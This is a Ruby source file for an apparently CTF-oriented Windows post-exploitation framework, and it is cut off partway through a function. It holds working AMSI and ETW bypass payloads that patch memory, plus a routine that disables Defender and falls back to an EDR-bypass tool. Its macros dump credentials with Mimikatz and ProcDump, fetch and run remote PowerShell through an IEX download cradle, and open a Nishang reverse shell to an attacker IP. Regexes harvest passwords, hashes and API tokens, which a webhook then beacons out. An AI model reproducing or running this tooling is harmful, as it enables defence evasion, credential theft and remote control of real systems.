#!/usr/bin/env ruby
# frozen_string_literal: true
# Compatibility shim – define Fixnum for Ruby 3.x
class Fixnum < Integer; end unless defined?(Fixnum)
require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'
require 'evil_ctf/crypto'
require 'evil_ctf/uploader'


module EvilCTF::Tools
  TOOL_REGISTRY = {
    'sharphound' => {
      name: 'SharpHound (BloodHound Collector)',
      filename: 'SharpHound.exe',
      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
      description: 'BloodHound AD collector',
      url: 'https://github.com/SpecterOps/SharpHound',
      download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
      backup_urls: [
        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
      auto_execute: false,
      category: 'recon'
    },
    'mimikatz' => {
      name: 'Mimikatz',
      filename: 'mimikatz_trunk.zip',
      search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
      description: 'Credential dumping tool',
      url: 'https://github.com/ParrotSec/mimikatz',
      download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
      backup_urls: [
        'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
      ],
      zip: true,
      zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
      zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'powerview' => {
      name: 'PowerView',
      filename: 'PowerView.ps1',
      search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
      description: 'AD recon PowerShell script',
      url: 'https://github.com/BC-SECURITY/Empire',
      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/powerview.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\PowerView.ps1',
      auto_execute: false,
      category: 'recon'
    },
    'rubeus' => {
      name: 'Rubeus',
      filename: 'Rubeus.exe',
      search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
      description: 'Kerberos abuse / roasting tool',
      url: 'https://github.com/GhostPack/Rubeus',
      download_url: 'https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe',
      backup_urls: [
        'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Rubeus.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Rubeus.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'seatbelt' => {
      name: 'Seatbelt',
      filename: 'Seatbelt.exe',
      search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
      description: 'Security auditing tool',
      url: 'https://github.com/GhostPack/Seatbelt',
      download_url: 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe',
      backup_urls: [
        'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Seatbelt.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Seatbelt.exe',
      auto_execute: false,
      category: 'recon'
    },
    'inveigh' => {
      name: 'Inveigh',
      filename: 'Inveigh.ps1',
      search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
      description: 'LLMNR/mDNS/NBNS spoofer / MITM',
      url: 'https://github.com/Kevin-Robertson/Inveigh',
      download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psm1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Inveigh.ps1',
      auto_execute: false,
      category: 'privilege'
    },
    'procdump' => {
      name: 'ProcDump',
      filename: 'procdump64.exe', # Will be adjusted based on architecture
      search_patterns: ['procdump.exe', 'procdump64.exe'],
      description: 'Sysinternals LSASS dumper',
      url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
      download_url: 'https://live.sysinternals.com/procdump64.exe',
      backup_urls: [
        'https://live.sysinternals.com/procdump.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\procdump64.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'winpeas' => {
      name: 'WinPEAS',
      filename: 'winPEASany_ofs.exe',
      search_patterns: ['winPEAS*.exe', 'winPEASany*.exe'],
      description: 'Windows privilege escalation checker',
      url: 'https://github.com/peass-ng/PEASS-ng',
      download_url: 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe',
      backup_urls: [
        'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\winPEAS.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'invoke_mimikatz' => {
      name: 'Invoke-Mimikatz',
      filename: 'Invoke-Mimikatz.ps1',
      search_patterns: ['Invoke-Mimikatz.ps1'],
      description: 'PowerShell version of Mimikatz for credential extraction',
      url: 'https://github.com/PowerShellMafia/PowerSploit',
      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Invoke-Mimikatz.ps1',
      auto_execute: false,
      category: 'privilege'
    },
    'nishang' => {
      name: 'Nishang',
      filename: 'nishang.zip',
      search_patterns: ['nishang.zip', 'nishang-master.zip'],
      description: 'Offensive PowerShell scripts collection',
      url: 'https://github.com/samratashok/nishang',
      download_url: 'https://github.com/samratashok/nishang/archive/refs/heads/master.zip',
      backup_urls: [],
      zip: true,
      zip_pick: 'nishang-master',
      recommended_remote: 'C:\\Users\\Public\\nishang-master',
      auto_execute: false,
      category: 'recon'
    },
    'socksproxy' => {
      name: 'Invoke-SocksProxy',
      filename: 'Invoke-SocksProxy.psm1',
      search_patterns: ['Invoke-SocksProxy.psm1', 'Invoke-SocksProxy.ps1'],
      description: 'SOCKS pivot via PowerShell module',
      url: 'https://github.com/p3nt4/Invoke-SocksProxy',
      download_url: 'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1',
      backup_urls: [
        'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/main/Invoke-SocksProxy.psm1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\socks.ps1',
      auto_execute: false,
      category: 'pivot'
    },
    'plink' => {
      name: 'Plink',
      filename: 'plink.exe',
      search_patterns: ['plink.exe', 'plink*.exe'],
      description: 'PuTTY Link - SSH tunnel tool',
      url: 'https://www.chiark.greenend.org.uk/~sgtatham/putty/',
      download_url: 'https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe',
      backup_urls: [
        'https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\plink.exe',
      auto_execute: false,
      category: 'pivot'
    },
    'edr_redir' => {
      name: 'EDR-Redir V2',
      filename: 'EDR-Redir_2.0.zip',
      search_patterns: ['EDR-Redir.exe'],
      description: 'EDR bypass tool using bind links',
      url: 'https://github.com/TwoSevenOneT/EDR-Redir',
      download_url: 'https://github.com/TwoSevenOneT/EDR-Redir/releases/download/V2/EDR-Redir_2.0.zip',
      backup_urls: [],
      zip: true,
      zip_pick_x64: 'EDR-Redir.exe',
      recommended_remote: 'C:\\Users\\Public\\EDR-Redir.exe',
      auto_execute: false,
      category: 'pivot'
    }
  }.freeze
  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS
  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  def self.disable_defender(shell)
  # Check OS version
  os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
  if os_info.include?("Windows 10")
    puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
  elsif os_info.include?("Windows 11")
    puts "[!] WARNING: This technique only works on Windows 10."
    puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
    puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
    return
  else
    puts "[!] Unknown OS: #{os_info}"
    return
  end

  # Check for Tamper Protection
  tamper_check = shell.run('Get-MpComputerStatus | Select-Object IsTamperProtected')
  if tamper_check.output.include?('True')
    puts "[!] Tamper Protection Enabled, will try anyways"
  end

  # Check Real-Time Protection
  status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
  if status.output.strip == 'True'
    puts "[*] Real-time protection is currently enabled"
  else
    puts "[-] Defender is already disabled"
    return
  end

  # Attempt to disable using standard method first
  ps_cmd = <<~PS
    try {
      $defender = Get-MpComputerStatus
      if ($defender.RealTimeProtectionEnabled) {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Output "[+] Defender real-time monitoring disabled"
      } else {
        Write-Output "[-] Defender already disabled"
      }
    } catch {
      Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
    }
  PS

  result = shell.run(ps_cmd)
  puts result.output

  # Final check: is Defender still enabled?
  final_status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
  if final_status.output.strip == 'True'
    puts "[!] WARNING: Defender is still enabled after attempted disable."
    puts "[*] Attempting EDR-Redir V2 bypass..."
    
    # Download and stage EDR-Redir
    edr_redir_path = download_tool('edr_redir')
    if !edr_redir_path
      puts "[!] Failed to download EDR-Redir"
      return false
    end
    
    # Stage EDR-Redir on target system
    remote_edr_redir = 'C:\\Users\\Public\\EDR-Redir.exe'
    EvilCTF::Uploader.upload_file(edr_redir_path, remote_edr_redir, shell)
    
    # Create temporary directory and run EDR-Redir to redirect Defender
    ps_cmd = <<~PS
      try {
        New-Item -ItemType Directory -Path "C:\\TMP\\TEMPDIR" -Force | Out-Null
        $result = Start-Process -FilePath "#{remote_edr_redir}" -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
        if ($result.ExitCode -eq 0) {
          Write-Output "[+] EDR-Redir V2 executed successfully"
        } else {
          Write-Output "[!] EDR-Redir V2 failed with exit code: $($result.ExitCode)"
        }
      } catch {
        Write-Output "[!] Error running EDR-Redir: $($_.Exception.Message)"
      }
    PS
    
    result = shell.run(ps_cmd)
    puts result.output
    
    # Move tools to the redirected location
    puts "[*] Moving tools to redirected directory..."
    
  else
    puts "[+] Defender successfully disabled with standard method"
  end
end  
  
  
  class CommandManager
    def initialize
      @aliases = {
        'ls' => 'Get-ChildItem',
        'dir' => 'Get-ChildItem',
        'whoami' => '$env:USERNAME',
        'pwd' => 'Get-Location',
        'cd' => 'Set-Location',
        'ps' => 'Get-Process',
        'processes' => 'Get-Process',
        'sysinfo' => 'systeminfo',
        'services' => 'Get-Service',
        'rm' => 'Remove-Item',
        'cat' => 'Get-Content',
        'mkdir' => 'New-Item -ItemType Directory',
        'cp' => 'Copy-Item',
        'mv' => 'Move-Item'
      }
      @macros = {
        'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
        'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp 2>$null'],
        'invoke-mimikatz' => [
          BYPASS_4MSI_PS,
          ETW_BYPASS_PS,
          'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")',
          'Invoke-Mimikatz -DumpCreds'
        ],
        'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\SharpHound.exe" -c all 2>$null'],
        'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\Seatbelt.exe" -group=all 2>$null'],
        'rubeus_klist' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" klist 2>$null'],
        'bypass-etw' => [ETW_BYPASS_PS],
        'bypass-4msi' => [BYPASS_4MSI_PS],
        'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'IEX (Get-Content "C:\\Users\\Public\\Inveigh.ps1" -Raw); Invoke-Inveigh -ConsoleOutput Y'],
        'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
        'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
        'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'IEX (Get-Content "C:\\Users\\Public\\nishang-master\\Shells\\Invoke-PowerShellTcp.ps1" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port 4444'],
        'powerview_all' => [BYPASS_4MSI_PS, 'IEX (Get-Content "C:\\Users\\Public\\PowerView.ps1" -Raw); Get-DomainUser; Get-DomainGroup; Get-DomainComputer; Get-DomainPolicy; Get-DomainTrust'],
        'dom_enum' => [BYPASS_4MSI_PS, 'IEX (Get-Content "C:\\Users\\Public\\PowerView.ps1" -Raw)', 'Get-Domain; Get-DomainController; Get-DomainUser; Get-DomainGroup; Get-DomainComputer; Get-DomainPolicy; Get-DomainGPO; Get-DomainOU; Get-DomainTrust; Get-ForestDomain; Find-DomainShare; Get-DomainFileServer; Get-DomainForeignUser; Get-DomainForeignGroupMember; Find-InterestingDomainAcl']
      }
    end
    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end
    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro
      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        begin
          result = shell.run(step)
          puts result.output.strip
          matches = EvilCTF::Tools.grep_output(result.output)
          if matches.any?
            EvilCTF::Tools.save_loot(matches)
            EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
          end
        rescue => e
          puts "[!] Macro step failed: #{e.message}"
        end
      end
      true
    end
    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end
  # Helper functions for tool handling
  def self.download_tool(key, remote_download: false, shell: nil)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])
    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    if File.exist?(path)
      puts "[+] #{tool[:name]} already downloaded at #{path}"
      return path
    end
    if remote_download && shell
      # Remote download on target
      begin
        puts "[*] Attempting remote download on target for #{key}..."
        ps_cmd = <<~PS
          try {
            (New-Object System.Net.WebClient).DownloadFile('#{tool[:download_url]}', '#{tool[:recommended_remote]}')
            "SUCCESS"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS
        result = shell.run(ps_cmd)
        if result.output.include?('SUCCESS')
          puts "[+] Remote download success for #{key}"
          return tool[:recommended_remote]  # Return remote path for staging
        else
          puts "[!] Remote download failed: #{result.output}"
        end
      rescue => e
        puts "[!] Remote download error: #{e.message}"
      end
    end
    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
    all_urls.compact!
    success = false
    all_urls.each do |url|
      next unless url
      puts "[*] Attempting local download from #{url}..."
      success = download_from_url(url, path)
      if success
        puts "[+] Success from #{url}"
        break
      else
        puts "[!] Failed from #{url}"
      end
    end
    if success
      path
    else
      puts "[!] All attempts failed for #{key}. Check network or URLs."
      nil
    end
  rescue => e
    puts "[!] Error downloading #{key}: #{e.message}"
    nil
  end
  def self.download_from_url(url, path)
    success = false
    # Try curl
    puts "[*] Trying curl..."
    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1")
    return success if success
    # Try wget
    puts "[*] Trying wget..."
    wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{wget_cmd} > /dev/null 2>&1")
    return success if success
    # Try Ruby URI.open
    puts "[*] Trying Ruby URI.open..."
    begin
      URI.open(url) do |f|
        File.binwrite(path, f.read)
      end
      success = true
    rescue => e
      puts "[!] Ruby URI failed: #{e.message}"
    end
    return success if success
    # Try PowerShell as last resort
    puts "[*] Trying PowerShell Invoke-WebRequest..."
    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
    success = system(ps_cmd)
    success
  end
  def self.download_missing_tools(remote_download: false, shell: nil)
    failures = []
    TOOL_REGISTRY.each do |key, tool|
      puts "\n[*] Checking #{tool[:name]} (#{key})..."
      
      # For zipped tools, we need special handling
      if tool[:zip]
        local_path = File.join('tools', tool[:filename])
        
        # Check if zip file exists locally
        unless File.exist?(local_path)
          puts "[*] Downloading ZIP for #{tool[:name]}..."
          unless download_tool(key, remote_download: remote_download, shell: shell)
            failures << key
            next
          end
        end
        
        # If we have the zip and are doing local staging, extract it locally first
        if !remote_download && File.exist?(local_path) && tool[:zip_pick]
          puts "[*] Extracting ZIP locally for #{tool[:name]}..."
          begin
            Zip::File.open(local_path) do |zip_file|
              # Extract the specific file we need
              zip_file.extract(tool[:zip_pick], local_path.gsub('.zip', '')) if zip_file.find_entry(tool[:zip_pick])
            end
          rescue => e
            puts "[!] ZIP extraction failed locally: #{e.message}"
          end
        end
      else
        # Original behavior for non-zip tools
        unless download_tool(key, remote_download: remote_download, shell: shell)
          failures << key
        end
      end
    end
    if failures.any?
      puts "\n[!] Failed to download: #{failures.join(', ')}"
      puts "[*] Suggestion: Manually download from #{TOOL_REGISTRY[failures.first][:url]} or check connectivity."
    else
      puts "[+] All tools downloaded successfully."
    end
  end
  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool
    
    # Check if we need to extract from ZIP
    needs_extraction = tool[:zip] && (tool[:zip_pick] || tool[:zip_pick_x64] || tool[:zip_pick_x86])
    
    remote_path = tool[:recommended_remote]
    
    # If it's a zip file, check for the extracted version instead
    if needs_extraction
      # For zipped tools, determine which file we're looking for after extraction
      extracted_file = nil
      
      if tool[:zip_pick_x64] && get_system_architecture(shell) == 'x64'
        extracted_file = tool[:zip_pick_x64].split('/').last
      elsif tool[:zip_pick_x86] && get_system_architecture(shell) == 'x86'
        extracted_file = tool[:zip_pick_x86].split('/').last
      elsif tool[:zip_pick]
        extracted_file = tool[:zip_pick].split('/').last
      end
      
      if extracted_file
        remote_path = File.join(File.dirname(tool[:recommended_remote]), extracted_file)
        
        check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
        result = shell.run(check_cmd)
        if result.output.include?('EXISTS')
          puts "[+] #{tool[:name]} already staged at #{remote_path}"
          return true
        end
      end
    end
    
    # ... existing code ...
    
    arch = get_system_architecture(shell)
    puts "[*] System architecture: #{arch}"
    adjusted_tool = tool.dup
    # architecture-specific adjustments
    if tool_key == 'procdump'
      if arch == 'x64'
        adjusted_tool[:filename] = 'procdump64.exe'
        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
      else
        adjusted_tool[:filename] = 'procdump.exe'
        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
      end
    elsif tool_key == 'mimikatz' && tool[:zip]
      adjusted_tool[:zip_pick] = (arch == 'x64') ? tool[:zip_pick_x64] : tool[:zip_pick_x86]
    end
    
    local_path = find_tool_on_disk(tool_key)
    unless local_path && File.exist?(local_path)
      puts "[!] Local #{adjusted_tool[:filename]} not found. Attempting download..."
      local_path = download_tool(tool_key)
      return false unless local_path && File.exist?(local_path)
    end
    
    # For zipped tools, we need to extract on target
    if needs_extraction
      # Stage the zip file first
      zip_remote_path = tool[:recommended_remote]
      
      # If it's a specific architecture-based zip pick, adjust remote path accordingly
      if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
        # For tools like nishang that have a single zip_pick
        zip_remote_path = tool[:recommended_remote]
      elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
        # For architecture-specific zips, we still stage to the main path but extract appropriately
        zip_remote_path = tool[:recommended_remote]
      end
      
      puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"
      
      # Upload the zip file
      success = EvilCTF::Uploader.upload_file(local_path, zip_remote_path, shell)
      return false unless success
      
      # Create PowerShell extraction script
      extract_ps = <<~PS
        try {
          $zipPath = '#{ps_single_quote_escape(zip_remote_path)}'
          $extractPath = '#{ps_single_quote_escape(File.dirname(tool[:recommended_remote]))}'
          
          Add-Type -AssemblyName System.IO.Compression.FileSystem
          [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
          
          # Remove the zip file after extraction
          Remove-Item $zipPath -Force
          
          "EXTRACTED"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS
      
      result = shell.run(extract_ps)
      if result.output.include?('EXTRACTED')
        puts "[+] ZIP extracted successfully on target"
        return true
      else
        puts "[!] ZIP extraction failed: #{result.output}"
        return false
      end
    else
      # Original behavior for non-zip tools
      puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
      EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
    end
  rescue => e
    puts "[!] Staging failed for #{tool_key}: #{e.message}"
    false
  end
  def self.execute_staged_tool(key, args = '', shell)
    tool = TOOL_REGISTRY[key]
    return false unless tool
    remote_path = tool[:recommended_remote]
    begin
      puts "[*] Executing #{key} with args: #{args}"
      ps_cmd = <<~PS
        try {
          $proc = Start-Process -FilePath "#{remote_path}" -ArgumentList "#{args}" -PassThru -WindowStyle Hidden
          $proc.WaitForExit(60000) | Out-Null
          if ($proc.HasExited) {
            "Completed with exit code: $($proc.ExitCode)"
          } else {
            "Timed out after 60 seconds"
            $proc.Kill()
          }
        } catch {
          "Error: $_.Exception.Message"
        }
      PS
      result = shell.run(ps_cmd)
      puts result.output
      true
    rescue => e
      puts "[!] Execution failed for #{key}: #{e.message}"
      false
    end
  end
  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
      end
    end
    puts "\nCommands:"
    puts " tools - List available tools"
    puts " download_missing - Download all missing tools into ./tools"
    puts " tool <name> - Stage and use a specific tool"
    puts " tool all - Stage all available tools"
    puts '=' * 70
  end
  # Helper functions for loot handling
  def self.grep_output(output)
    # Fixed grep_output to handle nil properly
    return [] if output.nil? || output.empty?
   
    # Add execution policy bypass check before attempting regex matching
    if output.include?('execution policy') || output.include?('SecurityError')
      puts "[!] PowerShell execution policy issue detected"
      return []
    end
   
    matches = []
    error_indicators = [
      'ObjectNotFound', 
      'CommandNotFoundException',
      'FileNotFoundException',
      'ResourceUnavailable',
      'Modules_ModuleNotFound',
      'CategoryInfo',
      'FullyQualifiedErrorId',
      'is not recognized'
    ]
    error_count = error_indicators.count { |error| output.include?(error) }
    total_lines = output.lines.count
    error_ratio = error_count.to_f / total_lines
    if error_ratio > 0.3
      puts "[*] Skipping loot scan - output appears to be mostly errors"
      return matches
    end
    patterns = [
      /flag\{[^\}]+\}/i,
      /htb\{[^\}]+\}/i,
      /picoctf\{[^\}]+\}/i,
      /ctf\{[^\}]+\}/i,
      /password\s*[:=]\s*["']?([^"'\s]+)["']?/i,
      /Password\s*[:=]\s*["']?([^"'\s]+)["']?/i,
      /pwd\s*[:=]\s*["']?([^"'\s]+)["']?/i,
      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i,
      /Token\s*[:=]\s*["']?([^"'\s]+)["']?/i,
      /[A-Fa-f0-9]{32}/,
      /[A-Fa-f0-9]{40}/,
      /[A-Fa-f0-9]{64}/,
      /[A-Fa-f0-9]{128}/,
      /[A-Za-z0-9+\/]{20,}={0,2}/,
      /(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/,
      /-----BEGIN [A-Z ]+-----/,
      /-----END [A-Z ]+-----/,
      /jwt\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i,
      /eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*/i,
      /(\w+@\w+\.\w+):([^@\s]+)/,
      /Username\s*:\s*(\S+)\s+Password\s*:\s*(\S+)/i,
      /User\s*:\s*(\S+)\s+Pass\s*:\s*(\S+)/i,
      /NTLM\s*:\s*([A-F0-9]{32})/i,
      /LM\s*:\s*([A-F0-9]{32})/i,
      /Hash\s*:\s*([A-F0-9]{32})/i,
      # Added more patterns
      /AKIA[0-9A-Z]{16}/,  # AWS Access Key
      /aws_secret_access_key\s*=\s*["']?([^"'\s]+)["']?/i,
      /ssh-rsa AAAA[0-9A-Za-z+\/]+[=]{0,3}/,  # SSH public key
      /-----BEGIN PRIVATE KEY-----/,  # Private keys
      /sk-[a-zA-Z0-9]{48}/,  # OpenAI API key
      /ghp_[0-9A-Za-z]{36}/,  # GitHub Personal Access Token
      /AIza[0-9A-Za-z\-_]{35}/,  # Google API key
      /ya29\.[0-9A-Za-z\-_]+/,  # Google OAuth
      /xoxp-[0-9A-Za-z\-]+/,  # Slack token
      /Bearer [A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/,  # JWT Bearer
      /azure_client_secret\s*=\s*["']?([^"'\s]+)["']?/i,  # Azure secret
      /DB_PASSWORD\s*=\s*["']?([^"'\s]+)["']?/i,  # DB passwords
      /PRIVATE-TOKEN:\s*[0-9a-zA-Z\-_]{20,}/,  # GitLab token
      /npm_token\s*=\s*[0-9a-f-]{36}/i  # NPM token
    ]
    output.each_line do |line|
      next if line.include?('CategoryInfo') || line.include?('FullyQualifiedErrorId') || line.include?('is not recognized')
      patterns.each do |regex|
        line.scan(regex).each do |match|
          if match.is_a?(Array)
            cleaned_match = match.compact.join(':')
            matches << cleaned_match unless cleaned_match.empty?
          else
            matches << match.strip
          end
        end
      end
    end
    matches.uniq
  end
  def self.save_loot(matches)
    # Fixed save_loot to handle empty matches properly
    return if matches.nil? || matches.empty?
    FileUtils.mkdir_p('loot')
    begin
      File.open('loot/loot.txt', 'a') do |f|
        matches.each do |m|
          f.puts(m) unless m.is_a?(String) && m.start_with?('{')
